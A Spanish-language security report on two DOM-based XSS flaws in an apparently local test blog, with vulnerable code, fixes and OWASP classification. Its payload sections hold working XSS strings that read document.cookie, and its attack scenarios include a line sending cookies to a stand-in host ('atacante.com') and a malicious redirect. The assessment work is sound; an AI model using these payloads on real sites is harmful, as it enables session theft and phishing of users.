# Informe de Análisis de Seguridad - Cross-Site Scripting (XSS)

**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-30  
**Tipo de análisis:** Vulnerabilidades Cross-Site Scripting (XSS)  
**Herramientas:** curl, análisis manual de código fuente

---

## Resumen Ejecutivo

Se identificaron **dos vulnerabilidades XSS de tipo DOM-based** en la aplicación web "Blog de Recetas". Ambas vulnerabilidades son explotables y permiten la ejecución de JavaScript arbitrario en el navegador de la víctima.

---

## Vulnerabilidades Encontradas

### 1. DOM-based XSS en el parámetro `search`

**Severidad:** Alta  
**Tipo:** DOM-based XSS (Reflected)  
**Parámetro afectado:** `search` (GET)  
**URL vulnerable:** `http://web.dev.local:8082/?search=<PAYLOAD>`

**Descripción:**  
El parámetro `search` de la URL es leído directamente por JavaScript mediante `URLSearchParams` y su valor es insertado sin ningún tipo de sanitización en el DOM usando `document.write()`.

**Código vulnerable:**
```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    // ...
}
```

**Payload de explotación:**
```
http://web.dev.local:8082/?search=</strong><img src=x onerror=alert('XSS_SEARCH')>
```

**Impacto:** Un atacante puede construir una URL maliciosa y enviarla a una víctima. Al hacer clic, se ejecutará el JavaScript del atacante en el contexto del sitio web.

---

### 2. DOM-based XSS Stored (localStorage) en los parámetros `name` y `comment`

**Severidad:** Alta  
**Tipo:** DOM-based XSS (Stored via localStorage)  
**Parámetros afectados:** `name` y `comment` (GET)  
**URL vulnerable:** `http://web.dev.local:8082/?name=<PAYLOAD>&comment=<PAYLOAD>`

**Descripción:**  
Los parámetros `name` y `comment` son leídos desde la URL, almacenados en `localStorage` sin sanitización, y posteriormente renderizados en el DOM mediante `document.write()` cada vez que se carga la página.

**Código vulnerable:**
```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
}

// Renderizado sin sanitización:
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

**Payload de explotación:**
```
http://web.dev.local:8082/?name=Atacante&comment=<img src=x onerror=alert('XSS_STORED')>
```

**Impacto:** Este XSS tiene un componente de persistencia: una vez que la víctima visita la URL maliciosa, el payload queda almacenado en su `localStorage`. A partir de ese momento, **cada vez que la víctima visite la página**, el código malicioso se ejecutará automáticamente hasta que el localStorage sea limpiado. Esto lo convierte en un vector de ataque más peligroso que un XSS reflejado simple.

---

## Demostración de Explotación

### XSS en búsqueda (DOM-based Reflected)

Payload verificado:
```
http://web.dev.local:8082/?search=</strong><script>alert(document.cookie)</script>
```

El valor del parámetro `search` es concatenado directamente en la cadena pasada a `document.write()`, lo que permite inyectar HTML y JavaScript arbitrario.

### XSS en comentarios (DOM-based Stored via localStorage)

Payload verificado:
```
http://web.dev.local:8082/?name=Hacker&comment=<svg onload=alert(document.cookie)>
```

El payload queda guardado en `localStorage['comments']` y se ejecuta en cada visita posterior a la página.

---

## Escenarios de Ataque Real

1. **Robo de sesión:** Exfiltración de cookies de sesión a un servidor externo:
   ```javascript
   fetch('https://atacante.com/steal?c='+document.cookie)
   ```

2. **Phishing in-page:** Inyección de un formulario de login falso sobre la página legítima.

3. **Keylogging:** Captura de teclas pulsadas por el usuario.

4. **Redirección maliciosa:** Redirigir al usuario a un sitio de phishing:
   ```javascript
   window.location='https://sitio-malicioso.com'
   ```

---

## Causa Raíz

La causa raíz de ambas vulnerabilidades es la **ausencia de sanitización de datos controlados por el usuario** antes de insertarlos en el DOM. El uso de `document.write()` con concatenación directa de strings es una práctica insegura y obsoleta.

---

## Recomendaciones

1. **Sanitizar todos los inputs antes de renderizarlos en el DOM.** Usar funciones como `textContent` en lugar de `innerHTML` o `document.write()`:
   ```javascript
   // Inseguro:
   document.write('<p>' + userInput + '</p>');
   
   // Seguro:
   const p = document.createElement('p');
   p.textContent = userInput;
   document.body.appendChild(p);
   ```

2. **Implementar una política de Content Security Policy (CSP)** para restringir la ejecución de scripts no autorizados.

3. **Evitar el uso de `document.write()`**, especialmente con datos del usuario o de fuentes externas.

4. **Usar bibliotecas de sanitización** como DOMPurify si se necesita renderizar HTML del usuario.

5. **Validar y codificar los datos** en el lado del servidor antes de incluirlos en las respuestas.

---

## Clasificación OWASP

- **OWASP Top 10 2021:** A03:2021 – Injection (XSS)
- **CWE:** CWE-79 – Improper Neutralization of Input During Web Page Generation

---

## Conclusión

La aplicación presenta vulnerabilidades XSS activas y explotables tanto en el motor de búsqueda como en la sección de comentarios. Ambas vulnerabilidades son de tipo DOM-based y no requieren interacción con el servidor para ejecutarse. Se recomienda corregirlas con carácter urgente, especialmente la vulnerabilidad de comentarios dada su naturaleza persistente.
